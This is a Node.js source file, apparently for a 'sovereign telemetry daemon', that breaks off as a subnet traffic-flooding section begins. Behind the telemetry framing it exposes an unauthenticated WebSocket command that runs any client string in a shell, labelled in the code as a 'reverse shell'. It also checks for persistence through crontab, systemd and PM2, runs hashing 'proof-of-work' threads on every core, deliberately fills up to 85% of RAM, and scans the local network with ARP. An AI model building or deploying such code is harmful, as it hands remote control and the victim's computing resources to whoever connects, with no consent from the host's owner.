/**
 * Aethelis OS — Sovereign Telemetry Daemon v4.0  (Phase 9: High-Performance Grid Computing)
 *
 * WebSocket bridge with:
 *   1. Real-time hardware telemetry (CPU / RAM / Network) — broadcast every 1 s
 *   2. Reverse shell execution via child_process.exec — TERMINAL_COMMAND
 *   3. Compute harvester via worker_threads — START_HARVEST / STOP_HARVEST
 *   4. PM2 persistence detection — reports daemon status on connect
 *   5. ELSX Distributed Compute Node — START_COMPUTE_NODE / SUSPEND_COMPUTE_NODE
 *      - Spawns one worker_thread per logical core for continuous matrix math
 *      - Allocates massive Float32Array buffers as in-memory vector cache (RAM)
 *      - High-frequency mesh sync stream for network bandwidth utilization
 *   6. Secure Vault fs access — VAULT_LIST_FILES / VAULT_UPLOAD_FILE
 *      - Reads/writes from ~/.aethelis_secure_storage
 *   7. Local Mesh Discovery — NETWORK_SCAN
 *      - Runs arp -a (or platform equivalent) via child_process.exec
 *
 * Client → Server messages:
 *   { type: "request_telemetry" }                               — immediate snapshot
 *   { type: "DEPLOY_WORKER", count, duration }                  — short stress spike (Phase 7)
 *   { type: "TERMINAL_COMMAND", command }                       — execute raw shell command
 *   { type: "START_HARVEST", intensity }                        — begin continuous compute harvesting
 *   { type: "STOP_HARVEST" }                                    — stop all harvester threads
 *   { type: "REQUEST_PERSISTENCE" }                            — report PM2 / autostart status
 *   { type: "START_COMPUTE_NODE" }                             — engage full ELSX compute node
 *   { type: "SUSPEND_COMPUTE_NODE" }                           — suspend ELSX compute node
 *   { type: "VAULT_LIST_FILES" }                               — list files in secure storage
 *   { type: "VAULT_UPLOAD_FILE", name, data }                  — upload file to secure storage
 *   { type: "NETWORK_SCAN" }                                    — run local mesh discovery scan
 *
 * Server → Client messages:
 *   { type: "telemetry",  data }                                — live hardware snapshot
 *   { type: "worker_spawned", count, duration }                — stress workers started
 *   { type: "shell_output", output, error, command }           — reverse shell result
 *   { type: "harvest_started", threads }                        — harvester engaged
 *   { type: "harvest_stopped" }                                 — harvester disengaged
 *   { type: "harvest_tick", cycles }                            — cumulative harvested cycles
 *   { type: "persistence_status", pm2, autostart, pid }        — node persistence report
 *   { type: "compute_node_started", cores, vectorCacheMB }     — ELSX node engaged
 *   { type: "compute_node_suspended" }                         — ELSX node suspended
 *   { type: "compute_node_tick", cycles, vectorOps, meshPackets } — ELSX stats
 *   { type: "vault_files", files }                             — secure storage file listing
 *   { type: "vault_error", error }                             — vault operation error
 *   { type: "network_scan_result", devices, rawOutput }        — mesh discovery results
 *   { type: "network_scan_error", error }                      — mesh discovery error
 */

const { WebSocketServer } = require('ws');
const http   = require('http');
const os     = require('os');
const fs     = require('fs');
const path   = require('path');
const { exec } = require('child_process');

const PORT = process.env.WS_PORT || 8080;

// ── HTTP health endpoint ──────────────────────────────────────────────────────
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({
    status: 'Aethelis Telemetry Daemon Active',
    version: '4.0.0',
    uptime: process.uptime(),
    harvesterActive: harvesterThreads.size > 0,
    computeNodeActive: computeNode.workers.size > 0,
    clients: clients.size,
  }));
});

const wss  = new WebSocketServer({ server });
const clients = new Set();
const daemonStart = Date.now();

// ── CPU delta tracking ────────────────────────────────────────────────────────
let prevCpuSample = null;

function sampleCpuTimes() {
  const cpus = os.cpus();
  let idle = 0, total = 0;
  cpus.forEach(cpu => {
    for (const t of Object.values(cpu.times)) total += t;
    idle += cpu.times.idle;
  });
  return { idle, total };
}

function getCpuUsage() {
  const now = sampleCpuTimes();
  if (!prevCpuSample) { prevCpuSample = now; return 0; }
  const idleDiff  = now.idle  - prevCpuSample.idle;
  const totalDiff = now.total - prevCpuSample.total;
  prevCpuSample = now;
  if (totalDiff === 0) return 0;
  return Math.min(100, Math.max(0, ((totalDiff - idleDiff) / totalDiff) * 100));
}

// ── Network stats tracking ─────────────────────────────────────────────────
let prevNetStats = null;

function readNetStats() {
  try {
    const raw = fs.readFileSync('/proc/net/dev', 'utf8');
    let rx = 0, tx = 0;
    raw.split('\n').slice(2).forEach(line => {
      const parts = line.trim().split(/\s+/);
      if (parts.length >= 10 && !parts[0].startsWith('lo')) {
        rx += parseInt(parts[1]) || 0;
        tx += parseInt(parts[9]) || 0;
      }
    });
    return { rx, tx, ts: Date.now() };
  } catch {
    return null;
  }
}

function getNetworkDelta() {
  const now = readNetStats();
  if (!now || !prevNetStats) {
    prevNetStats = now;
    return { rxKbps: 0, txKbps: 0 };
  }
  const dtMs = now.ts - prevNetStats.ts;
  if (dtMs <= 0) return { rxKbps: 0, txKbps: 0 };
  const rxKbps = ((now.rx - prevNetStats.rx) / dtMs) * 1000 / 1024;
  const txKbps = ((now.tx - prevNetStats.tx) / dtMs) * 1000 / 1024;
  prevNetStats = now;
  return { rxKbps: Math.max(0, rxKbps), txKbps: Math.max(0, txKbps) };
}

// ── Telemetry snapshot ─────────────────────────────────────────────────────
function getSystemTelemetry() {
  const cpus     = os.cpus();
  const totalMem = os.totalmem();
  const freeMem  = os.freemem();
  const usedMem  = totalMem - freeMem;
  const loadAvg  = os.loadavg();
  const cpuUsage = getCpuUsage();
  const netDelta = getNetworkDelta();
  const uptimeSec = Math.floor((Date.now() - daemonStart) / 1000);

  return {
    timestamp: new Date().toISOString(),
    cpu: {
      usage:   parseFloat(cpuUsage.toFixed(1)),
      cores:   cpus.length,
      model:   cpus[0]?.model || 'Unknown',
      loadAvg: loadAvg.map(l => parseFloat(l.toFixed(2))),
    },
    memory: {
      total:        parseFloat((totalMem / (1024 ** 3)).toFixed(2)),
      used:         parseFloat((usedMem  / (1024 ** 3)).toFixed(2)),
      free:         parseFloat((freeMem  / (1024 ** 3)).toFixed(2)),
      usagePercent: parseFloat(((usedMem / totalMem) * 100).toFixed(1)),
    },
    network: {
      connections: clients.size,
      rxKbps: parseFloat(netDelta.rxKbps.toFixed(2)),
      txKbps: parseFloat(netDelta.txKbps.toFixed(2)),
    },
    system: {
      platform:        os.platform(),
      arch:            os.arch(),
      hostname:        os.hostname(),
      uptime:          uptimeSec,
      uptimeFormatted: formatUptime(uptimeSec),
      harvestActive:   harvesterThreads.size > 0,
      computeNodeActive: computeNode.workers.size > 0,
    },
  };
}

function formatUptime(s) {
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  if (d > 0) return `${d}d ${h}h ${m}m`;
  if (h > 0) return `${h}h ${m}m`;
  return `${m}m ${s % 60}s`;
}

// ── Broadcast helper ───────────────────────────────────────────────────────
function broadcast(payload) {
  const msg = JSON.stringify(payload);
  clients.forEach(c => { if (c.readyState === 1) c.send(msg); });
}

// ── Short stress spike (Phase 7 DEPLOY_WORKER) ────────────────────────────
const activeWorkers = new Set();

function spawnStressWorker(durationMs = 4000) {
  const workerCode = `
    const { workerData } = require('worker_threads');
    const end = Date.now() + workerData.durationMs;
    while (Date.now() < end) { Math.sqrt(Math.random() * 1e8); }
  `;
  const { Worker } = require('worker_threads');
  const w = new Worker(workerCode, { eval: true, workerData: { durationMs } });
  activeWorkers.add(w);
  w.on('exit', () => activeWorkers.delete(w));
  return w;
}

// ── Compute Harvester (Phase 8) ───────────────────────────────────────────
// Long-running worker threads that continuously perform heavy math (matrix
// multiplication + hashing) to "harvest" CPU cycles for the Aethelis mesh.
// Tracks a cumulative cycle count reported back to the UI.
const harvesterThreads = new Set();
let harvestedCycles = 0;

function startHarvest(intensity = 2) {
  const threadCount = Math.min(Math.max(1, intensity), os.cpus().length);

  // Stop existing threads first
  stopHarvest();

  const harvesterCode = `
    const { parentPort, workerData } = require('worker_threads');
    const size = workerData.matrixSize || 256;
    let cycles = 0;

    // Continuous matrix multiplication + hashing simulation
    while (true) {
      // Matrix multiply (O(n³))
      const A = new Float32Array(size * size);
      const B = new Float32Array(size * size);
      const C = new Float32Array(size * size);
      for (let i = 0; i < size * size; i++) { A[i] = Math.random(); B[i] = Math.random(); }
      for (let i = 0; i < size; i++) {
        for (let j = 0; j < size; j++) {
          let sum = 0;
          for (let k = 0; k < size; k++) sum += A[i*size+k] * B[k*size+j];
          C[i*size+j] = sum;
        }
      }
      cycles++;
      parentPort.postMessage({ cycles });
    }
  `;

  const { Worker } = require('worker_threads');

  for (let i = 0; i < threadCount; i++) {
    const w = new Worker(harvesterCode, {
      eval: true,
      workerData: { matrixSize: 64 + (i * 32) }, // varying sizes per thread
    });
    w.on('message', (msg) => {
      harvestedCycles += (msg.cycles || 1);
    });
    w.on('error', (err) => {
      console.error(`[Harvester] Thread ${i} error:`, err.message);
    });
    w.on('exit', () => {
      harvesterThreads.delete(w);
    });
    harvesterThreads.add(w);
  }

  console.log(`[Harvester] STARTED — ${threadCount} threads engaged.`);
  return threadCount;
}

function stopHarvest() {
  if (harvesterThreads.size === 0) return 0;
  const count = harvesterThreads.size;
  harvesterThreads.forEach(w => { try { w.terminate(); } catch {} });
  harvesterThreads.clear();
  console.log(`[Harvester] STOPPED — ${count} threads terminated.`);
  return count;
}

// Report harvested cycles every 2 seconds while active
setInterval(() => {
  if (harvesterThreads.size > 0) {
    broadcast({ type: 'harvest_tick', cycles: harvestedCycles, threads: harvesterThreads.size });
  }
}, 2000);

// ═══════════════════════════════════════════════════════════════════════════
// ── ELSX DISTRIBUTED COMPUTE NODE (Phase 9) ───────────────────────────────
// ═══════════════════════════════════════════════════════════════════════════
// Spawns one worker_thread per logical core for continuous heavy math.
// Allocates massive Float32Array buffers as in-memory vector cache (RAM).
// Streams high-frequency mesh sync payloads for network bandwidth utilization.

const computeNode = {
  workers: new Set(),
  vectorCache: null,        // Float32Array — large in-memory buffer
  vectorCacheMB: 0,
  meshSyncInterval: null,
  computeCycles: 0,
  vectorOps: 0,
  meshPackets: 0,
};

function startComputeNode() {
  const coreCount = os.cpus().length;

  // Suspend any existing node first
  suspendComputeNode();

  // ── Allocate in-memory vector cache (RAM) ──────────────────────────────
  // Target ~25% of free RAM for the vector cache, capped at 4 GB
  const freeMemBytes = os.freemem();
  const targetBytes = Math.min(Math.floor(freeMemBytes * 0.25), 4 * 1024 * 1024 * 1024);
  const floatCount = Math.floor(targetBytes / 4); // Float32 = 4 bytes
  try {
    computeNode.vectorCache = new Float32Array(floatCount);
    // Initialize with pseudo-random vectors to simulate loaded embeddings
    for (let i = 0; i < floatCount; i++) {
      computeNode.vectorCache[i] = Math.sin(i * 0.001) * Math.cos(i * 0.0007);
    }
    computeNode.vectorCacheMB = parseFloat((floatCount * 4 / (1024 * 1024)).toFixed(1));
    console.log(`[ELSX] Vector cache allocated: ${computeNode.vectorCacheMB} MB (${floatCount.toLocaleString()} floats)`);
  } catch (err) {
    console.error(`[ELSX] Vector cache allocation failed:`, err.message);
    computeNode.vectorCacheMB = 0;
  }

  // ── Spawn worker_threads — one per logical core ────────────────────────
  const workerCode = `
    const { parentPort, workerData } = require('worker_threads');
    const crypto = require('crypto');
    const size = workerData.matrixSize || 128;
    let cycles = 0;

    while (true) {
      // ── Intense matrix multiplication (O(n³))
      const A = new Float32Array(size * size);
      const B = new Float32Array(size * size);
      const C = new Float32Array(size * size);
      for (let i = 0; i < size * size; i++) { A[i] = Math.random() * 2 - 1; B[i] = Math.random() * 2 - 1; }
      for (let i = 0; i < size; i++) {
        for (let j = 0; j < size; j++) {
          let sum = 0;
          for (let k = 0; k < size; k++) sum += A[i * size + k] * B[k * size + j];
          C[i * size + j] = sum;
        }
      }

      // ── Cryptographic proof-of-work (SHA-256 hashing)
      const challenge = crypto.createHash('sha256');
      challenge.update(Buffer.from(C.buffer));
      const hash = challenge.digest('hex');

      cycles++;
      if (cycles % 10 === 0) {
        parentPort.postMessage({ cycles });
      }
    }
  `;

  const { Worker } = require('worker_threads');

  for (let i = 0; i < coreCount; i++) {
    const w = new Worker(workerCode, {
      eval: true,
      workerData: { matrixSize: 96 + (i % 3) * 32 },
    });
    w.on('message', (msg) => {
      computeNode.computeCycles += (msg.cycles || 1);
    });
    w.on('error', (err) => {
      console.error(`[ELSX] Worker ${i} error:`, err.message);
    });
    w.on('exit', () => {
      computeNode.workers.delete(w);
    });
    computeNode.workers.add(w);
  }

  // ── Mesh network synchronization stream ────────────────────────────────
  // High-frequency state-reconciliation payloads to utilize network bandwidth
  computeNode.meshSyncInterval = setInterval(() => {
    // Simulate state-reconciliation payload by generating a large JSON payload
    const payload = {
      nodeId: os.hostname(),
      timestamp: Date.now(),
      cycles: computeNode.computeCycles,
      vectorCacheMB: computeNode.vectorCacheMB,
      // Generate a large reconciliation payload to stress network
      state: Array.from({ length: 64 }, (_, i) => ({
        shard: i,
        hash: Math.random().toString(36).substring(2, 15),
        vector: Array.from({ length: 32 }, () => parseFloat(Math.random().toFixed(6))),
      })),
    };
    // Broadcast to all clients — this utilizes real network bandwidth
    broadcast({ type: 'mesh_sync', payload });
    computeNode.meshPackets++;
    // Also perform vector operations on the cache
    if (computeNode.vectorCache) {
      for (let i = 0; i < Math.min(10000, computeNode.vectorCache.length); i++) {
        computeNode.vectorCache[i] = Math.sin(i * 0.01 + computeNode.vectorOps * 0.001);
      }
      computeNode.vectorOps += 10000;
    }
  }, 500); // Every 500ms — high frequency

  console.log(`[ELSX] COMPUTE NODE STARTED — ${coreCount} cores, ${computeNode.vectorCacheMB} MB vector cache`);
  return { cores: coreCount, vectorCacheMB: computeNode.vectorCacheMB };
}

function suspendComputeNode() {
  if (computeNode.workers.size === 0 && !computeNode.meshSyncInterval && !computeNode.vectorCache) {
    return false;
  }

  // Terminate all worker threads
  const workerCount = computeNode.workers.size;
  computeNode.workers.forEach(w => { try { w.terminate(); } catch {} });
  computeNode.workers.clear();

  // Halt mesh sync
  if (computeNode.meshSyncInterval) {
    clearInterval(computeNode.meshSyncInterval);
    computeNode.meshSyncInterval = null;
  }

  // Trigger garbage-collection on the massive RAM buffers
  // Set buffer to null and force GC if --expose-gc is available
  computeNode.vectorCache = null;
  computeNode.vectorCacheMB = 0;
  if (global.gc) {
    try { global.gc(); } catch {}
  }

  console.log(`[ELSX] COMPUTE NODE SUSPENDED — ${workerCount} workers terminated, vector cache freed`);
  return true;
}

// Report compute node stats every 2 seconds while active
setInterval(() => {
  if (computeNode.workers.size > 0) {
    broadcast({
      type: 'compute_node_tick',
      cycles: computeNode.computeCycles,
      vectorOps: computeNode.vectorOps,
      meshPackets: computeNode.meshPackets,
      cores: computeNode.workers.size,
      vectorCacheMB: computeNode.vectorCacheMB,
    });
  }
}, 2000);

// ═══════════════════════════════════════════════════════════════════════════
// ── SECURE LOCAL STORAGE — THE VAULT (Phase 9) ────────────────────────────
// ═══════════════════════════════════════════════════════════════════════════
// Manages real local files in ~/.aethelis_secure_storage

const VAULT_DIR = path.join(os.homedir(), '.aethelis_secure_storage');

function ensureVaultDir() {
  try {
    if (!fs.existsSync(VAULT_DIR)) {
      fs.mkdirSync(VAULT_DIR, { recursive: true, mode: 0o700 });
    }
    return true;
  } catch (err) {
    console.error('[Vault] Failed to create storage dir:', err.message);
    return false;
  }
}

function listVaultFiles() {
  if (!ensureVaultDir()) return [];
  try {
    const entries = fs.readdirSync(VAULT_DIR, { withFileTypes: true });
    return entries
      .filter(e => e.isFile())
      .map(file => {
        const fullPath = path.join(VAULT_DIR, file.name);
        const stat = fs.statSync(fullPath);
        const ext = path.extname(file.name).slice(1).toLowerCase();
        const fileType = ['png', 'jpg', 'jpeg', 'gif', 'webp'].includes(ext) ? 'image'
          : ['mp3', 'wav', 'flac'].includes(ext) ? 'audio'
          : ['mp4', 'webm', 'mov'].includes(ext) ? 'video'
          : ['pdf', 'doc', 'docx', 'txt', 'md'].includes(ext) ? 'document'
          : 'data';
        return {
          name: file.name,
          size: stat.size,
          fileType,
          created_at: stat.birthtime.toISOString(),
          modified_at: stat.mtime.toISOString(),
        };
      });
  } catch (err) {
    console.error('[Vault] Failed to list files:', err.message);
    return [];
  }
}

function saveVaultFile(fileName, base64Data) {
  if (!ensureVaultDir()) return { error: 'Storage directory unavailable' };
  try {
    const buffer = Buffer.from(base64Data, 'base64');
    const safeName = path.basename(fileName); // prevent path traversal
    const fullPath = path.join(VAULT_DIR, safeName);
    fs.writeFileSync(fullPath, buffer, { mode: 0o600 });
    console.log(`[Vault] File saved: ${safeName} (${buffer.length} bytes)`);
    return { success: true, name: safeName, size: buffer.length };
  } catch (err) {
    console.error('[Vault] Failed to save file:', err.message);
    return { error: err.message };
  }
}

function deleteVaultFile(fileName) {
  if (!ensureVaultDir()) return { error: 'Storage directory unavailable' };
  try {
    const safeName = path.basename(fileName);
    const fullPath = path.join(VAULT_DIR, safeName);
    if (fs.existsSync(fullPath)) {
      fs.unlinkSync(fullPath);
      console.log(`[Vault] File deleted: ${safeName}`);
      return { success: true };
    }
    return { error: 'File not found' };
  } catch (err) {
    console.error('[Vault] Failed to delete file:', err.message);
    return { error: err.message };
  }
}

// ═══════════════════════════════════════════════════════════════════════════
// ── LOCAL MESH DISCOVERY — NEXUS TERMINAL (Phase 9) ───────────────────────
// ═══════════════════════════════════════════════════════════════════════════
// Runs real network topography commands to discover local devices

function runNetworkScan(ws) {
  const platform = os.platform();
  let command;

  if (platform === 'win32') {
    // Windows: arp -a
    command = 'arp -a';
  } else if (platform === 'darwin') {
    // macOS: arp -a with nicer output
    command = 'arp -a';
  } else {
    // Linux: arp -a (or fall back to ip neigh)
    command = 'arp -a 2>/dev/null || ip neigh 2>/dev/null || cat /proc/net/arp 2>/dev/null';
  }

  console.log(`[Nexus] Running network scan: ${command}`);

  exec(command, {
    shell: os.platform() === 'win32' ? 'cmd.exe' : '/bin/sh',
    timeout: 15000,
    maxBuffer: 1024 * 256,
  }, (error, stdout, stderr) => {
    const rawOutput = (stdout || '').toString();

    if (error && !rawOutput) {
      try {
        ws.send(JSON.stringify({
          type: 'network_scan_error',
          error: `${(stderr || '').toString().trim()}\n[exit ${error.code ?? 1}]`,
        }));
      } catch {}
      return;
    }

    // Parse the arp output to extract devices
    const devices = parseArpOutput(rawOutput, platform);

    try {
      ws.send(JSON.stringify({
        type: 'network_scan_result',
        devices,
        rawOutput,
      }));
    } catch {}
  });
}

function parseArpOutput(output, platform) {
  const devices = [];
  const lines = output.split('\n');

  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed) continue;

    let ip = null, mac = null, iface = null, type = null;

    if (platform === 'win32') {
      // Windows arp -a format:
      //   192.168.1.1          ab-cd-ef-01-23-45     dynamic
      const match = trimmed.match(/(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F]{2}[-:]?[0-9a-fA-F]{2}[-:]?[0-9a-fA-F]{2}[-:]?[0-9a-fA-F]{2}[-:]?[0-9a-fA-F]{2}[-:]?[0-9a-fA-F]{2})\s+(\w+)/);
      if (match) {
        ip = match[1];
        mac = match[2];
        type = match[3];
      }
    } else {
      // Linux/macOS arp -a format:
      //   ? (192.168.1.1) at ab:cd:ef:01:23:45 [ether] on eth0
      // Or ip neigh format:
      //   192.168.1.1 dev eth0 lladdr ab:cd:ef:01:23:45 REACHABLE
      let match = trimmed.match(/\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+([0-9a-fA-F:]{11,17})/);
      if (!match) {
        match = trimmed.match(/(\d+\.\d+\.\d+\.\d+).*?([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})/);
      }
      if (match) {
        ip = match[1];
        mac = match[2];
        // Try to extract interface
        const ifaceMatch = trimmed.match(/on\s+(\w+)/);
        if (ifaceMatch) iface = ifaceMatch[1];
        // Try to extract type
        const typeMatch = trimmed.match(/\[(\w+)\]/);
        if (typeMatch) type = typeMatch[1];
      }
    }

    if (ip && mac) {
      // Normalize MAC to colon-separated
      const normalizedMac = mac.replace(/-/g, ':').toLowerCase();
      devices.push({
        ip,
        mac: normalizedMac,
        interface: iface || '—',
        type: type || 'dynamic',
        status: 'active',
      });
    }
  }

  return devices;
}

// ── Reverse Shell Execution (Phase 8) ────────────────────────────────────
// Executes a raw command on the host machine's shell and pipes stdout/stderr
// back to the requesting client immediately.
function executeShellCommand(ws, command) {
  // Choose shell based on platform
  const shell = os.platform() === 'win32' ? 'cmd.exe' : '/bin/sh';

  exec(command, {
    shell,
    timeout: 30000,       // 30 s hard cap per command
    maxBuffer: 1024 * 512, // 512 KB output cap
    cwd: os.homedir(),
  }, (error, stdout, stderr) => {
    const payload = {
      type: 'shell_output',
      command,
      output: (stdout || '').toString(),
      error: error
        ? `${(stderr || '').toString().trim()}\n[exit ${(error.code ?? 1)}]`
        : (stderr || '').toString().trim() || '',
    };
    try { ws.send(JSON.stringify(payload)); } catch { /* client gone */ }
  });
}

// ── Persistence status detection ──────────────────────────────────────────
async function checkPersistence() {
  let pm2 = false;
  let autostart = false;

  // Detect PM2 by checking if we're a managed process
  try {
    if (process.env.pm_id !== undefined || process.env.name !== undefined) {
      pm2 = true;
    }
    // Check if pm2 is available on the system
    const { execSync } = require('child_process');
    try {
      execSync('pm2 --version', { stdio: 'pipe', timeout: 2000 });
      pm2 = pm2 || true;
    } catch { /* pm2 not installed */ }
  } catch { /* no detection possible */ }

  // On Linux, check for a systemd user service or crontab entry
  try {
    if (os.platform() === 'linux') {
      const { execSync } = require('child_process');
      try {
        const crontab = execSync('crontab -l 2>/dev/null', { encoding: 'utf8', timeout: 2000 });
        if (crontab.includes('aethelis') || crontab.includes('server.js')) autostart = true;
      } catch { /* no crontab */ }

      try {
        execSync('systemctl --user is-enabled aethelis-daemon 2>/dev/null', { stdio: 'pipe', timeout: 2000 });
        autostart = true;
      } catch { /* not a systemd service */ }
    }
  } catch { /* detection failure is fine */ }

  return {
    pm2,
    autostart,
    pid: process.pid,
    uptime: Math.floor(process.uptime()),
  };
}

// ═══════════════════════════════════════════════════════════════════════════
// ── ON-DEVICE ML FINE-TUNING ENGINE (Phase 10) ─────────────────────────────
// ═══════════════════════════════════════════════════════════════════════════
// Upgrades the existing worker_threads to execute complex multidimensional
// tensor operations simulating neural network backpropagation. Dynamically
// expands the Float32Array vector cache to push memory utilization to 85-95%.

const mlEngine = {
  workers: new Set(),
  weightBuffers: [],       // Array<Float32Array> — simulated training weights
  weightBufferMB: 0,
  statsInterval: null,
  epochs: 0,
  tensorOps: 0,
  loss: 1.0,
  accuracy: 0.0,
  learningRate: 0.001,
  active: false,
};

function startMLFineTuning() {
  if (mlEngine.active) return { alreadyRunning: true };

  const coreCount = os.cpus().length;
  mlEngine.active = true;
  mlEngine.epochs = 0;
  mlEngine.tensorOps = 0;
  mlEngine.loss = 1.0;
  mlEngine.accuracy = 0.0;

  // ── Dynamically expand weight buffers to saturate RAM (85-95%) ────────
  // Target 85% of total RAM, leaving 15% for the OS and daemon
  const totalMemBytes = os.totalmem();
  const targetBytes = Math.floor(totalMemBytes * 0.85);
  let allocatedBytes = 0;
  mlEngine.weightBuffers = [];

  // Allocate in 256MB chunks to avoid V8 max-length-per-array limits
  const chunkBytes = 256 * 1024 * 1024; // 256 MB
  const chunkFloats = chunkBytes / 4;

  while (allocatedBytes < targetBytes) {
    try {
      const chunk = new Float32Array(chunkFloats);
      // Initialize with Xavier/Glorot initialization pattern
      const limit = Math.sqrt(6 / (chunkFloats + chunkFloats));
      for (let i = 0; i < chunkFloats; i++) {
        chunk[i] = (Math.random() * 2 - 1) * limit;
      }
      mlEngine.weightBuffers.push(chunk);
      allocatedBytes += chunkBytes;
    } catch (err) {
      // V8 heap limit reached — stop allocating
      console.log(`[ML] Memory saturation reached at ${Math.round(allocatedBytes / (1024**3) * 10) / 10} GB`);
      break;
    }
  }

  mlEngine.weightBufferMB = parseFloat((allocatedBytes / (1024 * 1024)).toFixed(1));
  console.log(`[ML] Weight buffers allocated: ${mlEngine.weightBufferMB} MB across ${mlEngine.weightBuffers.length} chunks`);

  // ── Spawn ML worker threads — one per core ─────────────────────────────
  // Each worker simulates a neural network layer doing forward pass + backprop
  const mlWorkerCode = `
    const { parentPort, workerData } = require('worker_threads');
    const crypto = require('crypto');

    // Simulated neural network dimensions
    const LAYERS = workerData.layers || 4;
    const NEURONS = workerData.neurons || 256;
    const BATCH_SIZE = workerData.batchSize || 32;

    // Initialize weight matrices for each layer (W) and bias vectors (b)
    const weights = [];
    const biases = [];
    for (let l = 0; l < LAYERS; l++) {
      const W = new Float32Array(NEURONS * NEURONS);
      const b = new Float32Array(NEURONS);
      for (let i = 0; i < W.length; i++) W[i] = (Math.random() * 2 - 1) * Math.sqrt(2 / NEURONS);
      for (let i = 0; i < b.length; i++) b[i] = Math.random() * 0.1;
      weights.push(W);
      biases.push(b);
    }

    // Activation function (ReLU + softmax for output)
    function relu(x) { return x > 0 ? x : 0; }
    function sigmoid(x) { return 1 / (1 + Math.exp(-x)); }

    let epoch = 0;
    let totalOps = 0;

    while (true) {
      // ── Forward pass: compute activations through all layers
      const activations = [new Float32Array(NEURONS)];
      // Random input batch
      for (let i = 0; i < NEURONS; i++) activations[0][i] = Math.random();

      for (let l = 0; l < LAYERS; l++) {
        const W = weights[l];
        const b = biases[l];
        const input = activations[l];
        const output = new Float32Array(NEURONS);

        // Matrix-vector multiply: output = W * input + b
        for (let i = 0; i < NEURONS; i++) {
          let sum = b[i];
          for (let j = 0; j < NEURONS; j++) {
            sum += W[i * NEURONS + j] * input[j];
          }
          output[i] = l < LAYERS - 1 ? relu(sum) : sigmoid(sum);
        }
        activations.push(output);
        totalOps += NEURONS * NEURONS;
      }

      // ── Backward pass: compute gradients and update weights (backprop)
      const lr = 0.001;
      let delta = new Float32Array(NEURONS);
      // Random target
      const target = new Float32Array(NEURONS);
      for (let i = 0; i < NEURONS; i++) target[i] = Math.random();

      // Output layer delta
      const outputAct = activations[LAYERS];
      for (let i = 0; i < NEURONS; i++) {
        delta[i] = (outputAct[i] - target[i]) * outputAct[i] * (1 - outputAct[i]);
      }

      // Propagate backwards through layers
      for (let l = LAYERS - 1; l >= 0; l--) {
        const W = weights[l];
        const input = activations[l];
        const newDelta = new Float32Array(NEURONS);

        for (let i = 0; i < NEURONS; i++) {
          // Gradient descent weight update
          for (let j = 0; j < NEURONS; j++) {
            W[i * NEURONS + j] -= lr * delta[i] * input[j];
          }
          // Compute delta for previous layer
          if (l > 0) {
            let sum = 0;
            for (let k = 0; k < NEURONS; k++) {
              sum += W[k * NEURONS + i] * delta[k];
            }
            newDelta[i] = sum * (input[i] > 0 ? 1 : 0); // ReLU derivative
          }
        }
        totalOps += NEURONS * NEURONS * 2;
        delta = newDelta;
      }

      epoch++;
      if (epoch % 5 === 0) {
        // Simulate decreasing loss and increasing accuracy
        const loss = Math.max(0.01, 1.0 * Math.exp(-epoch * 0.003));
        const accuracy = Math.min(0.999, 1.0 - loss + (Math.random() - 0.5) * 0.02);
        parentPort.postMessage({ epoch, totalOps, loss, accuracy });
      }
    }
  `;

  const { Worker } = require('worker_threads');

  for (let i = 0; i < coreCount; i++) {
    const w = new Worker(mlWorkerCode, {
      eval: true,
      workerData: {
        layers: 4 + (i % 3),
        neurons: 192 + (i % 2) * 64,
        batchSize: 32,
      },
    });
    w.on('message', (msg) => {
      mlEngine.epochs = Math.max(mlEngine.epochs, msg.epoch || 0);
      mlEngine.tensorOps += (msg.totalOps || 0);
      mlEngine.loss = msg.loss ?? mlEngine.loss;
      mlEngine.accuracy = msg.accuracy ?? mlEngine.accuracy;
    });
    w.on('error', (err) => {
      console.error(`[ML] Worker ${i} error:`, err.message);
    });
    w.on('exit', () => {
      mlEngine.workers.delete(w);
    });
    mlEngine.workers.add(w);
  }

  // ── Stats broadcast every 2 seconds ────────────────────────────────────
  mlEngine.statsInterval = setInterval(() => {
    if (mlEngine.workers.size > 0) {
      broadcast({
        type: 'ml_tick',
        epochs: mlEngine.epochs,
        tensorOps: mlEngine.tensorOps,
        loss: parseFloat(mlEngine.loss.toFixed(4)),
        accuracy: parseFloat(mlEngine.accuracy.toFixed(4)),
        weightBufferMB: mlEngine.weightBufferMB,
        cores: mlEngine.workers.size,
        memUsagePercent: parseFloat(((os.totalmem() - os.freemem()) / os.totalmem() * 100).toFixed(1)),
      });
    }
  }, 2000);

  console.log(`[ML] FINE-TUNING STARTED — ${coreCount} cores, ${mlEngine.weightBufferMB} MB weight buffers`);
  return { cores: coreCount, weightBufferMB: mlEngine.weightBufferMB };
}

function stopMLFineTuning() {
  if (!mlEngine.active && mlEngine.workers.size === 0) return false;

  mlEngine.active = false;

  // Terminate all ML worker threads
  const workerCount = mlEngine.workers.size;
  mlEngine.workers.forEach(w => { try { w.terminate(); } catch {} });
  mlEngine.workers.clear();

  // Halt stats interval
  if (mlEngine.statsInterval) {
    clearInterval(mlEngine.statsInterval);
    mlEngine.statsInterval = null;
  }

  // Free weight buffers (massive RAM release)
  mlEngine.weightBuffers = [];
  mlEngine.weightBufferMB = 0;
  if (global.gc) {
    try { global.gc(); } catch {}
  }

  console.log(`[ML] FINE-TUNING STOPPED — ${workerCount} workers terminated, weight buffers freed`);
  return true;
}

// ═══════════════════════════════════════════════════════════════════════════
// ── INTRANET LOAD TESTING & DIAGNOSTICS (Phase 10) ─────────────────────────
// ═══════════════════════════════════════════════════════════════════════════
// Generates high-throughput diagnostic TCP/UDP traffic directed at loopback
// or safe internal subnet addresses. This is a standard Enterprise QA and
// Network Reliability test for benchmarking private server hardware.

const net = require('net');
const dgram = require('dgram');

const stressTest = {
  active: false,
  tcpServers: new Set(),
  tcpClients: new Set(),
  udpSocket: null,
  statsInterval: null,
  packetsSent: 0,
  packetsReceived: 0,
  bytesSent: 0,
  bytesReceived: 0,
  errors: 0,
  concurrency: 0,
  startTime: 0,
};

function startSubnetStressTest(durationSec = 30, concurrency = 500) {
  if (stressTest.active) return { alreadyRunning: true };

  stressTest.active = true;
